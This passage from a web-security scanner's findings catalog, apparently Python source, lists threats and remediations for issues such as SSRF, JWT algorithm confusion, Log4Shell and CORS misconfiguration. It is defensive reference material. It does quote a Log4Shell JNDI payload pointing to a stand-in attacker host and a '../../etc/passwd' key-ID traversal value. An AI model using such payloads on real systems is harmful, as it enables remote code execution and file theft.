            "Missing Vary header causes CDN to serve responses crafted for one origin to all users",
            "Age header without Cache-Control exposes internal cache topology",
        ],
        "remediation": [
            "Never reflect arbitrary Host header values into responses — use a configured canonical hostname",
            "Set Vary: Origin, Host on all responses with dynamic content",
            "Require Cache-Control: no-store on sensitive authenticated pages",
        ],
    },
    "secret_in_error_page": {
        "severity": "HIGH",
        "short": "Secrets / Stack Traces in Error Pages",
        "cwe": "CWE-209", "owasp": "A05:2021",
        "threats": [
            "Stack traces expose internal file paths, class names, and framework versions",
            "Database connection strings in error pages reveal host, port, database name, and credentials",
            "API keys, tokens, and internal paths in error responses provide attacker footholds",
        ],
        "remediation": [
            "Disable debug mode / verbose error display in all production environments",
            "Implement a generic error page that logs full details server-side only",
            "Scan error responses in CI/CD pipeline with a secret-detection rule set",
        ],
    },
    # ── Phase 103 ─────────────────────────────────────────────────────────────
    "open_redirect_deep": {
        "severity": "HIGH",
        "short": "Open Redirect (Deep Check)",
        "cwe": "CWE-601", "owasp": "A01:2021",
        "threats": [
            "Open redirect used in phishing chains to borrow trust from the victim domain",
            "Meta-refresh and JS location.href redirects not caught by basic header checks",
            "Redirect parameters (next, return_to, url, redirect_uri) vulnerable to bypass via encoding",
        ],
        "remediation": [
            "Validate redirect destinations against a server-side allowlist of trusted URLs",
            "Reject any redirect target not on the allowlist; never reflect user-supplied URLs",
            "Audit all meta-refresh and JS redirect patterns alongside header-based redirects",
        ],
    },
    "insecure_deserialization_passive": {
        "severity": "CRITICAL",
        "short": "Insecure Deserialization Indicators",
        "cwe": "CWE-502", "owasp": "A08:2021",
        "threats": [
            "Java serialized objects in cookies/params enable RCE via gadget chains (Apache Commons)",
            "PHP object serialization (O:N:) in user input allows property injection attacks",
            "ViewState without MAC validation allows forged state leading to RCE in ASP.NET",
        ],
        "remediation": [
            "Never deserialize user-supplied data with native object deserialization formats",
            "Enable ViewStateMac and ViewStateEncryptionMode in ASP.NET applications",
            "For Java: use SerialKiller or RASP to block known gadget chain classes",
        ],
    },
    "xxe_passive": {
        "severity": "HIGH",
        "short": "XXE Passive Indicators",
        "cwe": "CWE-611", "owasp": "A03:2021",
        "threats": [
            "External entity processing enabled in XML parser allows file read and SSRF",
            "Parameter entity injection in DTD declarations allows exfiltrating data out-of-band",
            "Server echoes back injected entity content confirming exploitable XXE",
        ],
        "remediation": [
            "Disable DOCTYPE declarations globally in the XML parser configuration",
            "Use FEATURE_EXTERNAL_GENERAL_ENTITIES=false and FEATURE_EXTERNAL_PARAMETER_ENTITIES=false",
            "Prefer JSON APIs over XML where possible to eliminate the attack surface",
        ],
    },
    "ssrf_passive": {
        "severity": "CRITICAL",
        "short": "SSRF Passive Indicators",
        "cwe": "CWE-918", "owasp": "A10:2021",
        "threats": [
            "URL parameters (url, src, fetch, proxy) passed unsanitized to server-side HTTP clients",
            "Internal proxy/render endpoints reachable from the internet without authentication",
            "SSRF via metadata IP (169.254.169.254) echoed in error responses confirms reachability",
        ],
        "remediation": [
            "Validate all user-supplied URLs against a strict allowlist before server-side fetching",
            "Block RFC-1918 and link-local ranges at the egress firewall for web application processes",
            "Require authentication on all /fetch, /proxy, /render, /screenshot, /pdf endpoints",
        ],
    },
    # ── Phase 104 ─────────────────────────────────────────────────────────────
    "host_header_injection": {
        "severity": "HIGH",
        "short": "Host Header Injection",
        "cwe": "CWE-20", "owasp": "A03:2021",
        "threats": [
            "Injected Host header reflected in password-reset emails poisons reset link domain",
            "X-Forwarded-Host / X-Host override processed by app — allows cache poisoning",
            "Password reset URL hijacking redirects victim's reset token to attacker's domain",
        ],
        "remediation": [
            "Configure a canonical hostname in application config — never use request Host header for URL generation",
            "Validate Host header against a strict allowlist of permitted values; reject unknown hosts",
            "Configure reverse proxy to strip X-Forwarded-Host, X-Host, X-Forwarded-Server before proxying",
        ],
    },
    "clickjacking_advanced": {
        "severity": "HIGH",
        "short": "Clickjacking (Advanced)",
        "cwe": "CWE-1021", "owasp": "A05:2021",
        "threats": [
            "Sensitive pages frameable without X-Frame-Options or CSP frame-ancestors",
            "Deprecated ALLOW-FROM directive ignored by modern browsers — no framing protection",
            "JavaScript frame-busting code bypassed via sandbox attribute on framing iframe",
        ],
        "remediation": [
            "Set Content-Security-Policy: frame-ancestors 'self' on all sensitive pages",
            "Replace X-Frame-Options: ALLOW-FROM with CSP frame-ancestors (ALLOW-FROM is deprecated)",
            "Do not rely on JS frame-busting as sole protection — use HTTP headers",
        ],
    },
    "business_logic_exposure": {
        "severity": "HIGH",
        "short": "Business Logic Exposure",
        "cwe": "CWE-840", "owasp": "A01:2021",
        "threats": [
            "Price/quantity fields manipulable client-side allow purchasing at attacker-set prices",
            "Mass assignment vulnerabilities allow setting is_admin, role, or verified fields directly",
            "Admin API endpoints accessible without admin authentication",
        ],
        "remediation": [
            "Never trust client-supplied price or quantity — recalculate all values server-side",
            "Implement an explicit allowlist of user-settable fields; block is_admin, role, permission",
            "Require role-based access control checks on every admin API endpoint",
        ],
    },
    "api_versioning_security": {
        "severity": "MEDIUM",
        "short": "API Versioning Security",
        "cwe": "CWE-1104", "owasp": "A06:2021",
        "threats": [
            "Deprecated API versions (v1, v2) remain accessible with weaker security controls",
            "Version downgrade via Accept or X-API-Version header bypasses security controls on newer versions",
            "Unversioned /api/* endpoints bypass version-specific security middleware",
        ],
        "remediation": [
            "Decommission deprecated API versions: return 410 Gone and remove routes",
            "Apply security middleware uniformly across all active versions",
            "Reject or redirect version downgrade attempts via Accept / X-API-Version header",
        ],
    },
    # ── Phase 105 ─────────────────────────────────────────────────────────────
    "csrf_token_strength": {
        "severity": "HIGH",
        "short": "Weak CSRF Token",
        "cwe": "CWE-352", "owasp": "A01:2021",
        "threats": [
            "Short or low-entropy CSRF tokens brute-forceable in a reasonable number of requests",
            "SameSite=None without Secure flag allows CSRF token theft on non-HTTPS connections",
            "Predictable token sequences allow pre-computation of valid CSRF tokens",
        ],
        "remediation": [
            "Use cryptographically random CSRF tokens of at least 128 bits (32 hex chars)",
            "Set SameSite=Strict or SameSite=Lax on session cookies as defense-in-depth",
            "Never use SameSite=None without Secure; validate entropy on token generation",
        ],
    },
    "cors_preflight_deep": {
        "severity": "HIGH",
        "short": "CORS Preflight Misconfiguration",
        "cwe": "CWE-942", "owasp": "A01:2021",
        "threats": [
            "Reflected origin with credentials allows attacker site to make authenticated DELETE/PUT requests",
            "Missing Vary: Origin causes CDN to cache CORS response for one origin and serve it to others",
            "Access-Control-Allow-Credentials: true combined with permissive origin enables full auth bypass",
        ],
        "remediation": [
            "Maintain a server-side origin allowlist — never reflect the request Origin header directly",
            "Add Vary: Origin to all CORS responses so CDN caches are keyed by origin",
            "Never set Allow-Credentials: true with Allow-Origin: * or reflected origins",
        ],
    },
    "rate_limiting_detection": {
        "severity": "MEDIUM",
        "short": "Missing Rate Limiting on Auth Endpoints",
        "cwe": "CWE-307", "owasp": "A07:2021",
        "threats": [
            "Authentication endpoints without rate limiting allow unlimited credential stuffing attempts",
            "Password reset endpoints without rate limiting enable enumeration and DoS",
            "Missing 429 Too Many Requests response on repeated auth failures confirms no protection",
        ],
        "remediation": [
            "Implement rate limiting (e.g., 5 req/min) on all login, registration, and password-reset paths",
            "Return 429 with Retry-After header on rate limit breach; add CAPTCHA after threshold",
            "Use distributed rate limiting (Redis/Memcached) for horizontally-scaled deployments",
        ],
    },
    "jwt_algorithm_confusion": {
        "severity": "CRITICAL",
        "short": "JWT Algorithm Confusion",
        "cwe": "CWE-347", "owasp": "A02:2021",
        "threats": [
            "alg:none tokens accepted by server — anyone can forge valid tokens without a key",
            "Algorithm confusion RS256→HS256 uses the public key as HMAC secret — full auth bypass",
            "kid path traversal (../../etc/passwd) allows forcing an arbitrary HMAC key",
        ],
        "remediation": [
            "Explicitly specify allowed algorithms server-side — reject alg:none unconditionally",
            "Use algorithm-specific verification libraries; never accept both symmetric and asymmetric algs",
            "Validate kid against a strict allowlist; reject any kid containing path traversal characters",
        ],
    },
    # ── Phase 106 ─────────────────────────────────────────────────────────────
    "oauth_redirect_uri_validation": {
        "severity": "HIGH",
        "short": "OAuth Redirect URI Misconfiguration",
        "cwe": "CWE-601", "owasp": "A07:2021",
        "threats": [
            "Loose redirect_uri validation allows token theft to attacker-controlled domains",
            "Missing state parameter in OAuth flows enables CSRF-based account linking attacks",
            "Authorization code theft via Referer header when redirect_uri includes sensitive data",
        ],
        "remediation": [
            "Require exact redirect_uri matching in the authorization server — no wildcards or partial matches",
            "Generate and validate a cryptographically random state parameter on every OAuth flow",
            "Register only specific redirect URIs; reject any unregistered URI at authorization time",
        ],
    },
    "saml_passive": {
        "severity": "HIGH",
        "short": "SAML Response Vulnerability",
        "cwe": "CWE-347", "owasp": "A07:2021",
        "threats": [
            "SAML comment injection bypasses signature validation by inserting comments into NameID",
            "Weak signature algorithms (MD5, SHA1) in SAML assertions allow signature forging",
            "Unsigned SAML assertions accepted — identity claims can be tampered by attacker",
        ],
        "remediation": [
            "Validate SAML XML canonically before signature check; reject any comment nodes in assertions",
            "Enforce SHA-256 or stronger for SAML assertion signatures",
            "Reject unsigned assertions; pin the IdP signing certificate to prevent key substitution",
        ],
    },
    "file_upload_security": {
        "severity": "HIGH",
        "short": "Insecure File Upload",
        "cwe": "CWE-434", "owasp": "A04:2021",
        "threats": [
            "Upload endpoints accepting .php/.jsp/.asp allow remote code execution via webshell",
            "Content-Type only validation bypassed by changing MIME type — extension not checked",
            "SVG / HTML upload allows stored XSS executed in victim's browser",
        ],
        "remediation": [
            "Allowlist safe file extensions; reject .php, .jsp, .asp, .html, .svg at upload",
            "Re-encode all uploaded images server-side to strip embedded code",
            "Store uploads outside the web root or in a separate domain without execute permissions",
        ],
    },
    # ── Phase 107-108 ─────────────────────────────────────────────────────────
    "subdomain_takeover_passive": {
        "severity": "HIGH",
        "short": "Subdomain Takeover Risk",
        "cwe": "CWE-350", "owasp": "A05:2021",
        "threats": [
            "DNS CNAME pointing to deprovisioned cloud service allows anyone to claim the subdomain",
            "Subdomain takeover enables phishing on trusted company domain, cookie theft, and CSP bypass",
            "Services like GitHub Pages, Heroku, Fastly, and Azure Web Apps are common takeover targets",
        ],
        "remediation": [
            "Audit all DNS CNAME records — remove records for decommissioned services immediately",
            "Implement DNS monitoring that alerts when a CNAME target returns a takeover indicator",
            "Claim placeholder content on cloud platforms before deprovisioning DNS records",
        ],
    },
    "dns_rebinding_passive": {
        "severity": "HIGH",
        "short": "DNS Rebinding Risk",
        "cwe": "CWE-346", "owasp": "A01:2021",
        "threats": [
            "DNS rebinding bypasses SOP — attacker site resolves to internal IP after allowlist check",
            "Localhost/private IP references in responses confirm internal service reachability",
            "Arbitrary Host headers accepted without validation — precondition for DNS rebinding attacks",
        ],
        "remediation": [
            "Validate Host header against a strict allowlist; reject requests with unexpected Host values",
            "Implement DNS rebinding protection: check Referer and Origin on all sensitive endpoints",
            "Use IMDSv2 on cloud instances to require token-based metadata access",
        ],
    },
    "log_injection_passive": {
        "severity": "MEDIUM",
        "short": "Log Injection",
        "cwe": "CWE-117", "owasp": "A09:2021",
        "threats": [
            "CRLF injection into logs (\\r\\n) allows forging fake log entries and hiding attacker activity",
            "X-Log-Injected header reflected in response confirms server-side log injection point",
            "Log injection used to cover tracks or inject false audit entries during an incident",
        ],
        "remediation": [
            "Sanitize all log inputs: strip or encode \\r, \\n, and other control characters",
            "Use structured logging (JSON) to eliminate free-text log injection as an attack surface",
            "Never echo user-supplied input directly into log messages",
        ],
    },
    "parameter_pollution": {
        "severity": "MEDIUM",
        "short": "HTTP Parameter Pollution",
        "cwe": "CWE-235", "owasp": "A03:2021",
        "threats": [
            "Duplicate parameters processed differently by app and WAF layers — bypasses input validation",
            "Array-style parameters (?id[]=A&id[]=B) exploit framework-specific parsing quirks",
            "Parameter pollution used to bypass CSRF token checks by polluting the token parameter",
        ],
        "remediation": [
            "Define explicit behavior for duplicate parameters: reject duplicates or use first/last only",
            "Apply input validation at the application layer, not solely at the WAF",
            "Log and alert on duplicate parameter submissions as a WAF evasion signal",
        ],
    },
    # ── Phase 109 ─────────────────────────────────────────────────────────────
    "websocket_security_deep": {
        "severity": "HIGH",
        "short": "WebSocket Security Weakness",
        "cwe": "CWE-346", "owasp": "A01:2021",
        "threats": [
            "WebSocket over ws:// (plaintext) allows network-level eavesdropping and message injection",
            "Auth token in WebSocket URL (ws://...?token=...) logged in proxy and access logs",
            "Socket.io/sockjs endpoints without Origin validation accept cross-site WebSocket hijacking",
        ],
        "remediation": [
            "Use wss:// (WebSocket over TLS) exclusively — reject ws:// connections",
            "Authenticate WebSocket connections via cookie or signed handshake, not URL query parameters",
            "Validate Origin header against an allowlist during the WebSocket handshake",
        ],
    },
    "source_map_exposure": {
        "severity": "MEDIUM",
        "short": "JavaScript Source Map Exposure",
        "cwe": "CWE-540", "owasp": "A05:2021",
        "threats": [
            "Publicly accessible .map files expose full unminified source code to attackers",
            "Source maps reveal function names, business logic, secret key variables, and internal API paths",
            "sourceMappingURL comments in JS files allow automatic discovery of source map locations",
        ],
        "remediation": [
            "Remove sourceMappingURL comments from production JavaScript bundles",
            "Restrict .map file serving to authenticated internal IPs or VPN only",
            "Add //*.map deny rules in nginx/Apache configuration",
        ],
    },
    "feature_policy_security": {
        "severity": "MEDIUM",
        "short": "Permissive Permissions-Policy",
        "cwe": "CWE-16", "owasp": "A05:2021",
        "threats": [
            "Missing or overly permissive Permissions-Policy allows iframes to access camera/microphone",
            "Wildcard (*) in Permissions-Policy grants all origins access to sensitive browser features",
            "Unrestricted geolocation, payment, USB, and Bluetooth API access in embedded content",
        ],
        "remediation": [
            "Set Permissions-Policy to deny all features not explicitly required: camera=(), microphone=()",
            "Never use =* wildcards for high-risk features (camera, microphone, payment, geolocation)",
            "Audit third-party iframes — restrict their feature access via Permissions-Policy header",
        ],
    },
    # ── Phase 110 ─────────────────────────────────────────────────────────────
    "docker_exposure": {
        "severity": "CRITICAL",
        "short": "Docker / Container Infrastructure Exposed",
        "cwe": "CWE-284", "owasp": "A05:2021",
        "threats": [
            "Exposed Docker daemon API (port 2375) allows container creation with host volume mounts — full host RCE",
            "Unauthenticated Docker registry exposes all stored container images including secrets baked into layers",
            "Container management UI (Portainer, Rancher) without MFA enables full cluster control",
            "/.dockerenv or /proc/1/cgroup accessible via web — confirms container deployment for attacker recon",
        ],
        "remediation": [
            "Bind Docker socket to 127.0.0.1 only (dockerd --host=tcp://127.0.0.1:2375); use TLS + client cert for remote access",
            "Enable Docker registry authentication; never expose :5000 or /v2/ without credentials",
            "Restrict Portainer/Rancher to VPN or internal network; enforce MFA",
            "Configure web server to deny /.dockerenv, /proc, /sys, /etc paths",
        ],
    },
    "graphql_batch_attack": {
        "severity": "HIGH",
        "short": "GraphQL Batch / DoS Attack Surface",
        "cwe": "CWE-400", "owasp": "A04:2021",
        "threats": [
            "Query batching allows bundling hundreds of auth probes into a single HTTP request, bypassing rate limiting",
            "Alias flooding multiplies expensive resolver execution N times per request — memory/CPU DoS",
            "GraphQL IDE (GraphiQL, Playground) in production gives attackers a full schema exploration interface",
            "GET-based query execution enables CSRF attacks against mutations via simple image tags",
        ],
        "remediation": [
            "Disable query batching or enforce a batch size limit (max 5 operations per request)",
            "Enforce query complexity and depth limits (graphql-query-complexity, graphql-depth-limit)",
            "Disable GraphQL IDE in production; restrict to localhost or authenticated users",
            "Require POST with Content-Type: application/json for all mutation operations",
        ],
    },
    "api_key_rotation": {
        "severity": "HIGH",
        "short": "Long-Lived / Unrotated API Keys",
        "cwe": "CWE-321", "owasp": "A02:2021",
        "threats": [
            "JWTs without expiry (exp) remain valid indefinitely after compromise — token revocation is impossible",
            "AWS/GCP/Azure keys in page responses or JS bundles are publicly readable by any visitor",
            "Basic auth credentials encoded with btoa() in JS provide a false sense of security — trivially decoded",
            "Session cookies with multi-year max-age persist after device loss or XSS, extending attack window",
        ],
        "remediation": [
            "Always include exp in JWTs; use short-lived access tokens (≤1 hour) with refresh token rotation",
            "Never embed cloud credentials in client-side code; use IAM roles and instance metadata instead",
            "Perform all authentication server-side — never encode credentials in client JavaScript",
            "Set session cookie Max-Age to match session timeout; implement server-side session invalidation",
        ],
    },
    # ── Phase 111 ─────────────────────────────────────────────────────────────
    "subdomain_enum_passive": {
        "severity": "MEDIUM",
        "short": "Sensitive Subdomains in CT Logs / Passive DNS",
        "cwe": "CWE-200", "owasp": "A05:2021",
        "threats": [
            "Dev/staging/admin subdomains in CT logs expose the full internal infrastructure map to attackers",
            "Jenkins, GitLab, Jira, Confluence subdomains often have weaker authentication than production",
            "Wildcard certificates mask subdomain existence, complicating monitoring and revocation",
            "Large subdomain footprint increases takeover attack surface — one decommissioned service can compromise the parent domain",
        ],
        "remediation": [
            "Audit all subdomains in CT logs; decommission DNS records for unused services immediately",
            "Require VPN or SSO for all development, CI/CD, and internal tool subdomains",
            "Monitor crt.sh for new certificate issuance on your domain (set up email alerts)",
            "Prefer specific certificates over wildcard certificates where possible",
        ],
    },
    "redos_passive": {
        "severity": "MEDIUM",
        "short": "ReDoS — Regex Denial of Service Risk",
        "cwe": "CWE-1333", "owasp": "A04:2021",
        "threats": [
            "Catastrophic backtracking regex (a+)+ causes exponential CPU usage with crafted input — single-threaded DoS",
            "Dynamic RegExp construction from user input allows an attacker to supply a malicious pattern",
            "Server-side ReDoS can freeze the event loop (Node.js) or consume all CPU for seconds/minutes",
            "Client-side ReDoS freezes the browser tab, degrading user experience and enabling sustained DoS",
        ],
        "remediation": [
            "Audit all regex patterns with safe-regex or vuln-regex-detector in CI",
            "Use the re2 library (Google RE2) for server-side regex — guaranteed O(n) time",
            "Never construct RegExp from user-supplied strings; use literal patterns only",
            "Add input length limits before regex application as defense-in-depth",
        ],
    },
    "http2_rapid_reset": {
        "severity": "HIGH",
        "short": "HTTP/2 Rapid Reset (CVE-2023-44487)",
        "cwe": "CWE-400", "owasp": "A04:2021",
        "threats": [
            "Rapid Reset allows a single client to overwhelm servers by opening and immediately cancelling HTTP/2 streams at extreme rates",
            "Attack bypasses traditional connection-count DoS mitigations — uses valid connection, no bandwidth amplification",
            "Affected all major web servers and cloud load balancers before October 2023 patches",
            "gRPC services are especially vulnerable — HTTP/2 is mandatory and often less hardened",
        ],
        "remediation": [
            "Update web server: nginx ≥1.25.3, Apache ≥2.4.58, h2o ≥2.2.6, Caddy ≥2.7.5",
            "Enable SETTINGS_MAX_CONCURRENT_STREAMS ≤100 on your HTTP/2 server configuration",
            "Use a CDN/WAF with Rapid Reset mitigation (Cloudflare, AWS CloudFront, Google Cloud Armor all patched Oct 2023)",
            "Implement per-IP RST_STREAM rate limiting at the infrastructure layer",
        ],
    },
    # ── Phase 112 ─────────────────────────────────────────────────────────────
    "payment_page_security": {
        "severity": "CRITICAL",
        "short": "Payment Page Security / PCI DSS Gap",
        "cwe": "CWE-829", "owasp": "A08:2021",
        "threats": [
            "Checkout page without CSP is vulnerable to Magecart-style script injection stealing card numbers",
            "Inline scripts on payment pages bypass Content-Security-Policy and enable stored XSS skimming",
            "Unknown or unverified payment iframes are a supply-chain risk — one compromised provider = card theft at scale",
            "HTTP checkout page violates PCI DSS requirement 4.2.1 — cardholder data transmitted in plaintext",
        ],
        "remediation": [
            "Implement strict CSP on all payment pages: no unsafe-inline, script-src allowlist only (PCI DSS 6.4.3)",
            "Move all inline scripts to external files; use nonce-based CSP for any required inline scripts",
            "Verify all payment iframes come from PCI-compliant providers; add them to CSP frame-src allowlist",
            "Enforce HTTPS with HSTS on all checkout and payment paths; redirect all HTTP to HTTPS",
        ],
    },
    "health_endpoint_exposure": {
        "severity": "HIGH",
        "short": "Health / Metrics Endpoints Publicly Accessible",
        "cwe": "CWE-200", "owasp": "A05:2021",
        "threats": [
            "Prometheus /metrics exposes service names, dependency topology, error rates, and queue depths",
            "Spring Boot /actuator/health reveals database host names, Redis endpoints, and component health status",
            "Go /debug/pprof exposes live profiling data including goroutine stacks with internal call paths",
            "Health endpoints reveal build versions, internal hostnames, and service dependencies for attacker mapping",
        ],
        "remediation": [
            "Require authentication for all health endpoints beyond a minimal /healthz that returns only HTTP 200/503",
            "Restrict /metrics to internal monitoring network CIDR ranges using firewall rules or VPC security groups",
            "Disable sensitive Spring Boot actuator endpoints: management.endpoints.web.exposure.include=health,info",
            "Use Kubernetes NetworkPolicies to allow /healthz probe access only from kubelet, not from the internet",
        ],
    },
    # ── Phase 113 ─────────────────────────────────────────────────────────────
    "log4shell_passive": {
        "severity": "CRITICAL",
        "short": "Log4Shell / JNDI Injection (CVE-2021-44228)",
        "cwe": "CWE-917", "owasp": "A06:2021",
        "threats": [
            "Log4Shell allows unauthenticated RCE via JNDI lookup injection in any logged string (User-Agent, headers, form fields)",
            "Attack works against Log4j 2.0-beta9 through 2.17.0 — one of the most widely exploited CVEs in history",
            "A single HTTP request with ${jndi:ldap://attacker.com/a} in any logged field is sufficient to exploit",
            "Exposed log4j config files reveal logging destinations and internal hostnames",
        ],
        "remediation": [
            "Upgrade Log4j to 2.17.1+ (Java 8), 2.12.4+ (Java 7), or 2.3.2+ (Java 6) immediately",
            "Interim: set -Dlog4j2.formatMsgNoLookups=true JVM flag to disable JNDI lookups",
            "Block outbound LDAP/RMI connections from web application JVMs at the egress firewall",
            "Remove Log4j version strings from all response headers",
        ],
    },
    "cors_expose_headers": {
        "severity": "HIGH",
        "short": "CORS Sensitive Header Exposure",
        "cwe": "CWE-200", "owasp": "A01:2021",
        "threats": [
            "Access-Control-Expose-Headers with Authorization or X-API-Key allows cross-origin JavaScript to read credentials",
            "Wildcard (*) in Expose-Headers exposes ALL response headers to cross-origin requests",
            "ACEH combined with Allow-Credentials: true allows attacker sites to steal tokens on behalf of logged-in users",
            "Missing Vary: Origin on CORS responses allows CDN to cache and serve wrong CORS headers to other origins",
        ],
        "remediation": [
            "Never include Authorization, X-API-Key, Set-Cookie, or X-CSRF-Token in Access-Control-Expose-Headers",
            "Avoid wildcard (*) in Expose-Headers; enumerate only non-sensitive headers (Content-Length, X-Request-ID)",
            "Add Vary: Origin to all responses that include CORS headers",
            "Audit all cross-origin JavaScript consumers — they should not require access to sensitive response headers",
        ],
    },
    "cross_origin_isolation": {
        "severity": "MEDIUM",
        "short": "Missing Cross-Origin Isolation Headers",
        "cwe": "CWE-346", "owasp": "A05:2021",
        "threats": [
            "Without COOP: same-origin, cross-origin windows retain a reference to this browsing context enabling popup-based attacks",
            "Without COEP: require-corp, cross-origin resources can be embedded without opt-in, enabling Spectre side-channel attacks",
            "Lack of cross-origin isolation allows attackers to exploit high-resolution timers and SharedArrayBuffer for timing attacks",
            "Missing CORP header allows any origin to embed this resource via no-cors fetch or <img> speculation",
        ],
        "remediation": [
            "Add Cross-Origin-Opener-Policy: same-origin to all page responses",
            "Add Cross-Origin-Embedder-Policy: require-corp and ensure all sub-resources serve CORP or CORS opt-in",
            "Add Cross-Origin-Resource-Policy: same-site (or same-origin for stricter isolation) to responses",
            "Test cross-origin isolation with browser DevTools: crossOriginIsolated should be true",
        ],
    },
    "trusted_types_policy": {
        "severity": "MEDIUM",
        "short": "Trusted Types Not Enforced",
        "cwe": "CWE-79", "owasp": "A03:2021",
        "threats": [
            "Without require-trusted-types-for 'script' in CSP, dangerous DOM sinks (innerHTML, document.write) accept raw strings enabling DOM XSS",
            "Trusted Types API used without CSP enforcement is advisory only — violations are not blocked",
            "unsafe-eval in CSP alongside Trusted Types partially defeats DOM XSS protection",
            "Trusted Types set via meta http-equiv CSP is not enforced by browsers — HTTP header required",
        ],
        "remediation": [
            "Add require-trusted-types-for 'script' to the enforcing Content-Security-Policy HTTP header",
            "Define allowed Trusted Types policy names with the trusted-types directive",
            "Replace direct innerHTML/document.write usage with Trusted Types policies",
            "Remove unsafe-eval from CSP; refactor any eval() usage to avoid string-based code execution",
        ],
    },
    "nel_reporting": {
        "severity": "LOW",
        "short": "NEL / Reporting API Misconfiguration",
        "cwe": "CWE-200", "owasp": "A05:2021",
        "threats": [
            "Report-To or Reporting-Endpoints with RFC-1918 or internal hostname collector URLs expose internal infrastructure to page visitors",
            "NEL or Reporting collectors using HTTP (not HTTPS) send browser reports in plaintext where they can be intercepted",
            "NEL max_age=0 silently disables network error monitoring, masking production failures",
            "Malformed NEL header JSON silently disables network error logging without warning",
        ],
        "remediation": [
            "Use HTTPS collector endpoints that are on public infrastructure, not internal subnets",
            "Avoid internal hostnames (.internal, .corp, .intranet) in Report-To and Reporting-Endpoints",
            "Set NEL max_age to a positive value (e.g., 86400) for active network error monitoring",
            "Validate NEL header JSON syntax before deploying; use browser DevTools to verify NEL is active",
        ],
    },
    "speculation_rules_security": {
        "severity": "MEDIUM",
        "short": "Speculation Rules Security Issues",
        "cwe": "CWE-200", "owasp": "A05:2021",
        "threats": [
            "Wildcard href_matches (*) causes browser to speculatively prefetch ALL links including logout, delete, and state-change GET endpoints",
            "Sensitive URL paths (admin, checkout, login) in speculation rules trigger credentialed prefetch requests before user interaction",
            "Eager/immediate prerender executes page scripts and fires analytics beacons for pages the user never visits",
            "Speculation-Rules HTTP header reveals high-priority URL targets to attackers, providing a partial site map",
            "Speculation rules combined with No-Vary-Search can cause cache confusion — different URLs served the same cached response",
        ],
        "remediation": [
            "Scope speculation rules to safe, non-sensitive URL prefixes (e.g., /blog/, /docs/) only",
            "Exclude logout, delete, admin, checkout, and payment paths from all speculation rules",
            "Use 'moderate' or 'conservative' eagerness for prerender entries; avoid 'eager' and 'immediate'",
            "Serve speculation rules inline via <script type='speculationrules'> rather than via HTTP header",
            "Audit No-Vary-Search directives when combined with speculation rules to prevent cache confusion",
        ],
    },
    "origin_trial_exposure": {
        "severity": "HIGH",
        "short": "Chrome Origin Trial Dangerous Feature",
        "cwe": "CWE-200", "owasp": "A05:2021",
        "threats": [
            "DirectSockets origin trial enables raw TCP/UDP socket access from browser — bypasses same-origin policy for network connections",
            "SharedStorageAPI enables cross-context data read-back via worklets, potentially leaking user state across sites",
            "Third-party origin trial tokens enable experimental APIs for all embedded third-party scripts on the page",
            "Origin-Trial header reveals experimental feature adoption, giving attackers a map of non-standard APIs available on the page",
        ],
        "remediation": [
            "Remove Origin-Trial tokens for features no longer actively used",
            "Avoid third-party origin trials (isThirdParty: true) unless strictly necessary",
            "Audit all active origin trials quarterly against the Chrome Origin Trials registry",
            "Do not use DirectSockets, SharedStorageAPI, or Private Network Access trials in production without security review",
        ],
    },
    "link_resource_hints_security": {
        "severity": "MEDIUM",
        "short": "Resource Hints Security Issues",
        "cwe": "CWE-200", "owasp": "A05:2021",
        "threats": [
            "dns-prefetch or preconnect to internal/RFC-1918 addresses exposes internal network topology to page visitors",
            "prefetch/preload of sensitive API paths or admin URLs reveals backend architecture and may trigger rate limits",
            "modulepreload from CDN without SRI integrity attribute is vulnerable to supply chain compromise",
            "Cross-origin preload without crossorigin attribute causes double fetch — one unauthenticated, one with credentials",
        ],
        "remediation": [
            "Remove dns-prefetch and preconnect hints pointing to internal/RFC-1918 addresses or internal hostnames",
            "Restrict prefetch and preload to publicly-cacheable, non-sensitive assets only",
            "Add integrity='sha384-...' and crossorigin='anonymous' to all CDN modulepreload links",
            "Audit <link rel> elements for cross-origin preload that require the crossorigin attribute",
        ],
    },
    "webhook_security": {
        "severity": "HIGH",
        "short": "Webhook Endpoint Security Issues",
        "cwe": "CWE-306", "owasp": "A07:2021",
        "threats": [
            "Webhook endpoint accessible via GET allows discovery and probing without authentication",
            "Webhook endpoint echoing back payload on GET may reveal event structure and IDs",
            "Webhook debug/tunnel interface (ngrok, hookdeck, svix) exposed in production allows inspection of all webhook events",
            "HTTP (non-TLS) webhook URL means payloads (including HMAC secrets in headers) are sent in cleartext",
        ],
        "remediation": [
            "Webhook paths must only accept POST — return 405 for GET, HEAD, PUT, DELETE",
            "Never echo webhook payloads or event IDs in the HTTP response",
            "Disable or restrict ngrok/hookdeck/svix debug interfaces in production",
            "Enforce HTTPS for all webhook receiver endpoints; reject HTTP connections at the load balancer",
        ],
    },
    "http_range_security": {
        "severity": "LOW",
        "short": "HTTP Range Request Misconfiguration",
        "cwe": "CWE-200", "owasp": "A05:2021",
        "threats": [
            "Accept-Ranges on JSON API endpoints enables byte-range timing oracle attacks against secret tokens in response body",
            "Accept-Ranges on auth endpoints allows partial content extraction from authentication responses",
            "Content-Range header reveals total resource size, enabling file identity confirmation for encrypted files",
            "Multipart byteranges response from API endpoints indicates server treats application data as splittable file content",
        ],
        "remediation": [
            "Set Accept-Ranges: none on all API, auth, and application endpoints",
            "Disable range request processing at the application layer for non-static-file endpoints",
            "Suppress Content-Range headers for sensitive resources",
            "Configure reverse proxy (nginx/Apache) to strip range request handling for /api/ paths",
        ],
    },
    "content_disposition_security": {
        "severity": "HIGH",
        "short": "Content-Disposition Security Issues",
        "cwe": "CWE-434", "owasp": "A03:2021",
        "threats": [
            "SVG or HTML files served inline from upload paths execute JavaScript in the site's origin, enabling stored XSS via file upload",
            "JavaScript files served from media/upload paths can be executed in the same origin with full same-origin privileges",
            "Path traversal sequences (../) in Content-Disposition filename may confuse downstream parsers (wget, curl, API clients)",
            "RTL override (U+202E) in filename makes executables appear to have safe extensions to unsuspecting users",
            "Executable file extensions (.exe, .bat, .ps1) served as attachments bypass OS-level download warnings on trusted domains",
        ],
        "remediation": [
            "Set Content-Disposition: attachment on all file-serving paths (especially /uploads, /media, /files)",
            "Sanitize Content-Disposition filename: strip path separators, control characters, and Unicode overrides",
            "Never serve user-uploaded SVG, HTML, or JavaScript files inline in the upload origin",
            "Block or rename dangerous extensions (.exe, .bat, .ps1) at the upload endpoint before serving",
        ],
    },
    "cookies_partitioned_security": {
        "severity": "MEDIUM",
        "short": "CHIPS / Partitioned Cookie Issues",
        "cwe": "CWE-1275", "owasp": "A05:2021",
        "threats": [
